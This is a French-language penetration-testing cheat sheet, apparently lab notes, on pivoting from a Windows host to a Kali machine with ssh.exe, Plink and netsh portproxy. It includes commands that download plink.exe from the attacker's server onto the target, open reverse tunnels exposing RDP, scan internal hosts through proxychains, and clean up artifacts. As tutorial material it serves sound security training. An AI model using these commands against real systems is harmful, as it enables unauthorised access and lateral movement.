# Port Forwarding with Windows Tools

## ssh.exe (OpenSSH natif Windows)

OpenSSH est inclus par défaut depuis Windows 1803 (avril 2018). L'exécutable est dans `%SystemRoot%\System32\OpenSSH\ssh.exe`.

```powershell
where ssh
ssh -V   # doit être >= 7.6 pour le remote dynamic port forwarding
```

La syntaxe est identique au client Linux -  on peut donc créer les mêmes tunnels (remote, remote dynamic, local…).

**Remote Dynamic Port Forwarding depuis Windows**

```cmd
ssh -N -R 9998 kali@<IP_KALI>
```

Le proxy SOCKS s'ouvre sur `127.0.0.1:9998` côté Kali. Configurer Proxychains et utiliser le tunnel exactement comme avec un client Linux :

```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 9998

# Utilisation depuis Kali
proxychains psql -h <IP_INTERNE> -U postgres
proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
```

## Plink

Alternative à OpenSSH quand celui-ci n'est pas disponible. Binaire autonome, aucune installation requise, discret (outil d'admin courant).

**Limitations :** pas de remote dynamic port forwarding. Le mot de passe passé en clair sur la ligne de commande peut être loggué.

### Déposer Plink sur la cible

```bash
cp /usr/share/windows-resources/binaries/plink.exe .
python3 -m http.server 80
```

Depuis la cible Windows
```cmd
powershell wget -Uri http://<IP_KALI>/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

### Remote Port Forwarding

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:<PORT_KALI>:127.0.0.1:<PORT_CIBLE> <IP_KALI>
```

```cmd
:: Exemple : ramener le port RDP (3389) sur le port 9833 de Kali
C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <IP_KALI>
```

> Si le shell ne permet pas de répondre à la confirmation de clé SSH, piper `y` directement :
> ```cmd
> cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <IP_KALI>
> ```

### Utiliser le tunnel depuis Kali

```bash
xfreerdp /u:<user> /p:<password> /v:127.0.0.1:9833
```

## Netsh (portproxy)

Port forwarding natif Windows, sans binaire externe. Nécessite des **privilèges administrateur**. Laisse des artefacts (règle de portproxy + règle firewall) à nettoyer après usage.

### Créer le port forward

```cmd
netsh interface portproxy add v4tov4 listenaddress=<IP_WAN> listenport=<PORT_ECOUTE> connectaddress=<IP_CIBLE> connectport=<PORT_CIBLE>
```

```cmd
:: Exemple : forwarder le port 2222 de MULTISERVER03 vers SSH de PGDATABASE01
netsh interface portproxy add v4tov4 listenaddress=192.168.50.64 listenport=2222 connectaddress=10.4.50.215 connectport=22
```

**Vérifier**

```cmd
netsh interface portproxy show all
netstat -anp TCP | find "2222"
```

### Ouvrir le firewall Windows

Le port forward sera `filtered` tant qu'aucune règle firewall ne l'autorise :

```cmd
netsh advfirewall firewall add rule name="<NOM_REGLE>" protocol=TCP dir=in localip=<IP_WAN> localport=<PORT_ECOUTE> action=allow
```

### Utiliser le tunnel depuis Kali

```bash
ssh database_admin@<IP_WAN> -p 2222
```

### Nettoyage (obligatoire)

```cmd
:: Supprimer la règle firewall
netsh advfirewall firewall delete rule name="<NOM_REGLE>"

:: Supprimer le port forward
netsh interface portproxy del v4tov4 listenaddress=<IP_WAN> listenport=<PORT_ECOUTE>
```
